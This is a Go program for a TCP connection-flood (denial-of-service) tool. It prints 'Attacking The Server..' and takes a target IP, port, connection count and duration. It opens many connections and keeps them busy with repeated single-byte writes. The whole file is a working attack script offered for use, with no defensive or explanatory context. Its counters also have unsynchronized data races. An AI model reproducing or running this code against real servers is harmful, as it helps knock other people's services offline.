package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	count = 0
	stop  = 0
	fail  = 0
)

func main() {
	fmt.Printf("Attacking The Server.. ")
	fmt.Print("Method Made By Kotaroisnice")
	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <ip> <port> <connections> <seconds> <timeout>\n", os.Args[0])
		fmt.Println("Example: TCP 1.1.1.1 80 1250 60 5")
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("port should be an integer")
		return
	}
	connections, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("connections should be an integer")
		return
	}
	duration, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("seconds should be an integer")
		return
	}
	// timeout is declared but not used
	_, err = strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("timeout should be an integer")
		return
	}

	addr := ip + ":" + strconv.Itoa(port)
	var wg sync.WaitGroup

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s, err := net.Dial("tcp", addr)
			if err != nil {
				fail++
				return
			}
			defer s.Close()
			for {
				if stop > 0 {
					break
				}
				_, err := s.Write([]byte{0})
				if err != nil {
					fail++
				} else {
					count++
				}
				time.Sleep(time.Millisecond * 100) // Adjust if needed
			}
		}()
	}

	time.Sleep(time.Duration(duration) * time.Second)
	stop = 1
	wg.Wait()
	fmt.Printf("Total Connections: %d\n", connections)
	fmt.Printf("Connection Alive: %d\n", count)
	fmt.Printf("Connection Error: %d times\n", fail)
}
